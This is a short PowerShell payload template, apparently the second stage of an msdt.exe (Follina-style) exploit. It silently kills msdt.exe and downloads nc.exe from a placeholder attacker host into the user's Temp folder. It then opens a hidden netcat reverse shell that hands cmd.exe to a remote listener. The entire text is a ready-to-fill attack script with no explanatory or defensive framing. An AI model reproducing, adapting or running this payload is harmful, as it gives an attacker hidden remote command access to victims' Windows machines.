$cmd = "c:\windows\system32\cmd.exe";
Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";

Invoke-WebRequest http://{HOST}:{PORT}/nc.html -O $env:LOCALAPPDATA\Temp\nc.exe

Start-Process $cmd  -windowstyle hidden -ArgumentList "/k %LocalAppData%\Temp\nc.exe -e cmd.exe {HOST_IP_REV} {PORT_REV}";

